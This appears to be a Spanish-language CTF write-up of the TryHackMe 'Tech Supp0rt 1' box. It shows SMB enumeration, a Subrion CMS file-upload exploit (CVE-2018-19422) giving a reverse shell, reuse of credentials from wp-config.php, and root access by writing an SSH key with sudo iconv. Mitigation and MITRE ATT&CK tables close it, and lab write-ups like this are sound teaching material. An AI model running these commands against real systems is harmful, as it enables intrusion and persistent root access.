@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina Tech Supp0rt 1 TryHackMe | ZsZsec</title>
+<meta content="Enumeración inicial Comencé con una fase de escaneo agresivo utilizando nmap para identificar puertos abiertos, servicios activos y versiones de software. Ejecuté el siguiente coma..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">TryHackMe</p>
+<h1>Maquina Tech Supp0rt 1 TryHackMe<span>_</span></h1>
+<div class="writeup-meta"><span>Nmap / web / WordPress</span></div>
+<div class="tag-row"><span class="tag">Nmap</span><span class="tag">web</span><span class="tag">WordPress</span><span class="tag">Subrion</span><span class="tag">CVE-2018-19422</span><span class="tag">Netcat</span><span class="tag">smbclient</span><span class="tag">samba</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h2>Enumeración inicial</h2>
+<p>Comencé con una fase de escaneo agresivo utilizando <code>nmap</code> para identificar puertos abiertos, servicios activos y versiones de software. Ejecuté el siguiente comando:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~]
+└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 10.10.95.117 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-21 14:43 CDT
+Nmap scan report for 10.10.95.117
+Host is up (0.18s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 10:8a:f5:72:d7:f9:7e:14:a5:c5:4f:9e:97:8b:3d:58 (RSA)
+|   256 7f:10:f5:57:41:3c:71:db:b5:5b:db:75:c9:76:30:5c (ECDSA)
+|_  256 6b:4c:23:50:6f:36:00:7c:a6:7c:11:73:c1:a8:60:0c (ED25519)
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: techsupport
+|   NetBIOS computer name: TECHSUPPORT\x00
+|   Domain name: \x00
+|   FQDN: techsupport
+|_  System time: 2025-07-22T01:14:10+05:30
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: -1h49m59s, deviation: 3h10m30s, median: 0s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-07-21T19:44:08
+|_  start_date: N/A
+</code></pre>
+<p>Resultado del escaneo:</p>
+<pre><code class="language-bash">22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu
+80/tcp  open  http        Apache httpd 2.4.18
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
+445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu
+</code></pre>
+<p>Se identificaron <strong>cuatro puertos abiertos</strong>: SSH (22), HTTP (80), y Samba (139/445). La presencia de Samba nos abre la posibilidad de realizar una enumeración de recursos compartidos.</p>
+<h2>Enumeración SMB</h2>
+<p>Ejecuté una exploración de recursos compartidos sin autenticación:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~]
+└─$ smbclient -L 10.10.52.97 -N
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        websvr          Disk      
+        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            
+
+</code></pre>
+<p>El recurso compartido <code>websvr</code> llamó mi atención, así que lo monté y exploré su contenido:</p>
+<pre><code class="language-bash">smbclient //10.10.95.117/websvr -N
+</code></pre>
+<p>Dentro encontré un archivo llamado <code>enter.txt</code>. Lo descargué con <code>get enter.txt</code> y lo leí:</p>
+<pre><code class="language-bash">──(zikuta㉿zikuta)-[~/techsupport]
+└─$ cat enter.txt                  
+GOALS
+=====
+1)Make fake popup and host it online on Digital Ocean server
+2)Fix subrion site, /subrion doesn't work, edit from panel
+3)Edit wordpress website
+
+IMP
+===
+Subrion creds
+|-&gt;admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
+Wordpress creds
+|-&gt;
+                                                                       
+</code></pre>
+<p>Esto nos reveló tres pistas importantes:</p>
+<ol>
+<li>El CMS <strong>Subrion</strong> está instalado en <code>/subrion</code>, aunque no está funcionando correctamente.</li>
+<li>Hay credenciales (aparentemente cifradas) para <strong>Subrion</strong>.</li>
+<li>Hay también un sitio con <strong>WordPress</strong> que necesita edición.</li>
+</ol>
+<h2>Enumeración Web</h2>
+<p>Accedí a la URL <code>http://10.10.95.117/subrion/panel</code>, lo cual me llevó al panel de inicio de sesión del CMS Subrion.</p>
+<p>Como la contraseña parecía cifrada, utilicé CyberChef para probar varias recetas automáticas hasta que se descifró correctamente como: <code>Scam2021</code><br/>
+<img alt="Image" src="https://github.com/user-attachments/assets/1a342252-5c61-48d4-818a-813b85c2380b"/></p>
+<h2>Acceso al panel Subrion</h2>
+<p>Ingresé exitosamente en <code>http://10.10.95.117/subrion/panel</code> con:</p>
+<ul>
+<li><strong>Usuario:</strong> <code>admin</code></li>
+<li><strong>Contraseña:</strong> <code>Scam2021</code></li>
+</ul>
+<p>Ya dentro del panel, mi siguiente paso será explorar funcionalidades que permitan <strong>cargar archivos</strong> modificar contenido o escalar privilegios. Pero hasta este punto, la fase de <strong>enumeración y acceso inicial al CMS</strong> se logró con éxito.</p>
+<h3>Explotación de Subrion CMS 4.2.1 - RCE mediante File Upload</h3>
+<p><strong>Target:</strong> <code>http://10.10.95.117/subrion/</code><br/>
+<strong>Versión Vulnerable:</strong> Subrion CMS 4.2.1<br/>
+<strong>Vector de Ataque:</strong> File Upload Bypass → RCE (Reverse Shell)<br/>
+<strong>Shell obtenida:</strong> <code>www-data</code><br/>
+<strong>Usuario del sistema:</strong> <code>scamsite</code></p>
+<h2><strong>Raíz de la Vulnerabilidad</strong></h2>
+<p>Subrion CMS 4.2.1 presentaba <strong>validación insuficiente</strong> en la función de subida de archivos, permitiendo a usuarios autenticados (incluso con bajos privilegios) cargar archivos ejecutables maliciosos. Los mecanismos de protección fallaban en:</p>
+<p><strong>Validación de extensiones</strong>:</p>
+<ul>
+<li><p>Lista negra incompleta (omitía <code>.phar</code>, <code>.php7</code>, <code>.inc</code>).</p>
+</li>
+<li><p>No normalización de cadenas (ej: <code>.PhP</code> != <code>.php</code>).</p>
+</li>
+</ul>
+<p><strong>Procesamiento del servidor</strong>:</p>
+<ul>
+<li><p>Configuraciones por defecto de Apache/Nginx ejecutaban archivos con doble extensiones (ej: <code>file.php.jpg</code> si <code>mod_mime</code> estaba mal configurado).</p>
+</li>
+<li><p>PHP interpretaba <code>.phar</code> como código ejecutable si <code>phar.readonly = Off</code>.</p>
+</li>
+</ul>
+<h2><strong>Vectores de Ataque Confirmados</strong></h2>
+<h3><strong>Bypass con extensión <code>.phar</code></strong></h3>
+<p><strong>Mecanismo</strong>:</p>
+<ul>
+<li>Archivos PHAR (<code>PHP Archive</code>) contienen código PHP comprimido y son ejecutables si el servidor no los bloquea.</li>
+<li>Subrion no filtraba <code>.phar</code> en sus listas negras.</li>
+</ul>
+<h4>Explotación de CVE-2018-19422</h4>
+<p>Utilicé un exploit público que automatiza el proceso de autenticación, obtiene el token CSRF necesario, evade las restricciones de subida, y carga una webshell PHP con una reverse shell embebida.</p>
+<h3>Ejecución del exploit:</h3>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/techsupport]
+└─$ python3 subrion.py -u http://10.10.95.117/subrion/
+[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - 
+
+[+] Trying to connect to: http://10.10.95.117/subri
+[+] Success!
+[+] Got CSRF token: z8KjVfMfO1y1g4IYwXaFJTEP6qDRZ6x
+[+] Trying to log in...
+[+] Login Successful!
+
+[+] Generating random name for Webshell...
+[+] Generated webshell name: uwavtenzasdwriq
+
+[+] Trying to Upload Reverse Shell...
+[+] Checking if reverse shell was uploaded correctl
+</code></pre>
+<h4>Conexión inversa</h4>
+<p>Se activó un listener en el puerto 4444 para recibir la shell:</p>
+<pre><code class="language-bash">──(zikuta㉿zikuta)-[~/techsupport]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.23.120.245] from (UNKNOWN) [10.10.95.117] 42828
+bash: cannot set terminal process group (1378): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@TechSupport:/var/www/html/subrion/uploads$ cd ../
+cd ../
+www-data@TechSupport:/var/www/html/subrion$ whoami
+whoami
+www-data
+</code></pre>
+<h3><strong>Obtención de Shell como www-data</strong></h3>
+<p>Tras explotar una vulnerabilidad de <strong>File Upload en Subrion CMS 4.2.1</strong>, obtuve una shell inversa como el usuario <code>www-data</code>. Sin embargo, esta shell era <strong>no interactiva</strong>, lo que limitaba mi capacidad de ejecutar comandos como <code>sudo</code>.</p>
+<h3><strong>Mejorando la Shell con Python PTY</strong></h3>
+<p>Para obtener una <strong>terminal interactiva</strong>, ejecuté:</p>
+<pre><code class="language-bash">www-data@TechSupport:/$ python -c 'import pty; pty.spawn("/bin/bash")'
+</code></pre>
+<p>Esto me permitió usar funciones como <strong>autocompletado</strong> y <strong>historial de comandos</strong>, esenciales para una enumeración eficiente.</p>
+<h3>## <strong>Enumeración y Movimiento Lateral</strong></h3>
+<p>Una vez obtenida la shell en la máquina comprometida, inicié el proceso de reconocimiento local con el objetivo de identificar archivos sensibles que pudieran contener credenciales o configuraciones útiles para una posible escalada de privilegios.</p>
+<p>Durante esta etapa, explorando las rutas comunes de aplicaciones web, localicé el archivo de configuración de WordPress (<code>wp-config.php</code>), el cual contenía credenciales en texto plano para la base de datos:</p>
+<pre><code class="language-bash">/** MySQL database username */
+define( 'DB_USER', 'support' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
+</code></pre>
+<h3><strong>Acceso al Usuario <code>scamsite</code></strong></h3>
+<p>Probé reutilizar estas credenciales para el usuario <code>scamsite</code></p>
+<pre><code class="language-bash">su scamsite 
+Password: ImAScammerLOL!123!
+
+scamsite@TechSupport:/$ sudo -l
+sudo -l
+Matching Defaults entries for scamsite on TechSupport:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User scamsite may run the following commands on TechSupport:
+    (ALL) NOPASSWD: /usr/bin/iconv
+</code></pre>
+<p><strong>¡Éxito!</strong> Ahora tenía acceso como <code>scamsite</code>.</p>
+<h2><strong>Escalada de Privilegios Abuso de  <code>iconv</code></strong></h2>
+<p><strong>Análisis Técnico</strong>:</p>
+<ul>
+<li><code>iconv</code> es una utilidad para conversión de codificación de caracteres.</li>
+<li>El permiso <code>NOPASSWD</code> permite ejecutarlo como root sin contraseña.</li>
+<li>El binario tiene capacidad de leer y escribir archivos.</li>
+</ul>
+<h2><strong>Investigación de las Capacidades de iconv</strong></h2>
+<p>Examiné el comportamiento de <code>iconv</code> con:</p>
+<pre><code class="language-bash">scamsite@TechSupport:~$ iconv --help
+Usage: iconv [OPTION...] [FILE...]
+Convert encoding of given files from one encoding to another.
+
+Options:
+  -f, --from-code=NAME       encoding of original text
+  -t, --to-code=NAME         encoding for output
+  -o, --output=FILE          output file
+</code></pre>
+<p><strong>Hallazgos Clave</strong>:</p>
+<ul>
+<li>Puede leer archivos (<code>FILE</code> argumento de entrada)</li>
+<li>Puede escribir archivos (<code>-o</code> permite especificar salida)</li>
+<li>No tiene restricciones de path al ejecutarse como root</li>
+</ul>
+<h2><strong>Explotación Técnica Escritura Arbitraria como Root</strong></h2>
+<h3><strong>Estrategia Seleccionada</strong></h3>
+<p>Inyectar una clave SSH pública en <code>/root/.ssh/authorized_keys</code> para obtener acceso persistente como root.</p>
+<h3><strong>Proceso Detallado:</strong></h3>
+<p><strong>1. Generación de Clave SSH en nuestra maquina</strong></p>
+<pre><code class="language-bash">                                                
+┌──(zikuta㉿zikuta)-[~/techsupport]
+└─$ ssh-keygen -t rsa
+Generating public/private rsa key pair.
+</code></pre>
+<p><strong>Transferencia de Clave Pública a Víctima:</strong></p>
+<p>Copiamos la clave ssh con</p>
+<pre><code class="language-bash">cat ~/.ssh/id_rsa.pub
+</code></pre>
+<p>Pegamos nuestra clave en la maquina victima</p>
+<pre><code class="language-bash">echo "ssh-rsa ________"  sudo iconv -f utf-8 -t utf-8 -o /root/.ssh/authorized_keys
+</code></pre>
+<ul>
+<li><code>iconv</code> se usa para <strong>escribir archivos como root</strong> debido a <code>sudo</code>.</li>
+<li>La clave pública se guarda en <code>/root/.ssh/authorized_keys</code>, permitiendo conexión SSH como <code>root</code>.</li>
+</ul>
+<ul>
+<li><code>-f utf-8 -t utf-8</code>: Conversión trivial (misma codificación)</li>
+</ul>
+<h2><strong>Conexión SSH como Root</strong></h2>
+<p>Procedemos a intentar conectarnos por ssh.</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/techsupport]
+└─$ ssh -i ~/.ssh/id_rsa root@10.10.201.96         Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+120 packages can be updated.
+88 updates are security updates.
+
+
+Last login: Sun Nov 21 11:17:57 2021
+root@TechSupport:~# cat root.txt
+</code></pre>
+<p>Nos hemos conectado de forma exitosa como el usuario <code>root</code>.</p>
+<h1>Conclusion</h1>
+<p>A lo largo de este proceso de ataque, comenzamos identificando y explotando una vulnerabilidad de ejecución remota de código (RCE) en Subrion CMS 4.2.1 (CVE-2018-19422) a través de su función de carga de archivos, lo que nos permitió obtener un acceso inicial como el usuario www-data y posteriormente mejorar a una shell interactiva usando Python.</p>
+<p>Durante la fase de enumeración, descubrimos credenciales almacenadas en texto plano en el archivo wp-config.php de WordPress, las cuales fueron reutilizadas exitosamente para escalar privilegios al usuario scamsite mediante el comando su.</p>
+<p>Una vez como scamsite, el análisis de permisos sudo reveló la capacidad de ejecutar iconv como root sin contraseña, vector que aprovechamos para escribir nuestra clave SSH pública en el archivo authorized_keys de root, logrando así acceso persistente como superusuario. Este ataque demostró múltiples fallos de seguridad críticos: una aplicación web sin parches, almacenamiento inseguro de credenciales, reutilización de contraseñas, permisos sudo excesivamente permisivos y falta de monitoreo en directorios sensibles, vulnerabilidades que podrían mitigarse mediante actualizaciones periódicas, implementación de políticas de contraseñas robustas, restricción estricta de permisos sudo, configuración adecuada de controles de acceso y auditorías continuas del sistema, destacando la importancia de un enfoque de defensa en profundidad para proteger sistemas contra ataques multifásicos como el aquí documentado.</p>
+<h1><strong>Mitigación del Ataque</strong></h1>
+<h2><strong>Plan de Mitigación Integral</strong></h2>
+<table>
+<thead>
+<tr>
+<th>Componente Vulnerable</th>
+<th>Acción Correctiva</th>
+<th>Impacto</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Subrion CMS 4.2.1</strong></td>
+<td>Actualizar a última versión (≥4.2.3)</td>
+<td>Elimina RCE</td>
+</tr>
+<tr>
+<td><strong>Permiso sudo <code>iconv</code></strong></td>
+<td>Remover en <code>/etc/sudoers</code>: <code>scamsite ALL=(root) NOPASSWD: /usr/bin/iconv</code></td>
+<td>Previene escalada</td>
+</tr>
+<tr>
+<td><strong>Reutilización de credenciales</strong></td>
+<td>Implementar políticas de contraseñas únicas</td>
+<td>Reduce movimiento lateral</td>
+</tr>
+<tr>
+<td><strong>/root/.ssh sin auditoría</strong></td>
+<td>Configurar <code>auditd</code> para monitorear cambios</td>
+<td>Detecta intrusiones</td>
+</tr>
+</tbody>
+</table>
+<h3><strong>Hardening del Sistema</strong></h3>
+<pre><code class="language-bash"># 1. Restringir permisos SSH
+chmod 700 /root/.ssh
+chmod 600 /root/.ssh/authorized_keys
+
+# 2. Instalar y configurar AppArmor para iconv
+sudo apt install apparmor-utils
+sudo aa-genprof /usr/bin/iconv
+# Configurar perfil para solo permitir conversiones legítimas
+
+# 3. Habilitar auditing
+sudo apt install auditd
+sudo auditctl -a always,exit -F path=/usr/bin/iconv -F perm=x -k sudo_icon
+</code></pre>
+<h1>MITRE ATT&amp;CK</h1>
+<table>
+<thead>
+<tr>
+<th>Táctica</th>
+<th>Técnica ID</th>
+<th>Nombre de la Técnica</th>
+<th>Ejemplo en el Ataque</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Initial Access</strong></td>
+<td>T1190</td>
+<td>Exploit Public-Facing Application</td>
+<td>Explotación de Subrion CMS 4.2.1 (CVE-2018-19422)</td>
+</tr>
+<tr>
+<td><strong>Persistence</strong></td>
+<td>T1098.004</td>
+<td>SSH Authorized Keys</td>
+<td>Inyección de clave SSH en /root/.ssh/authorized_keys</td>
+</tr>
+<tr>
+<td><strong>Privilege Escalation</strong></td>
+<td>T1548.001</td>
+<td>Abuse Elevation Control Mechanism: setuid/sudo</td>
+<td>Abuso de <code>sudo iconv</code> para escalada</td>
+</tr>
+<tr>
+<td><strong>Defense Evasion</strong></td>
+<td>T1070.004</td>
+<td>File Deletion</td>
+<td>No se observó limpieza de logs</td>
+</tr>
+<tr>
+<td><strong>Lateral Movement</strong></td>
+<td>T1078.003</td>
+<td>Valid Accounts: Local Accounts</td>
+<td>Reuso de credenciales WordPress → scamsite</td>
+</tr>
+<tr>
+<td><strong>Execution</strong></td>
+<td>T1059.004</td>
+<td>Command and Scripting Interpreter: Unix Shell</td>
+<td>Uso de shell bash/python</td>
+</tr>
+</tbody>
+</table>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
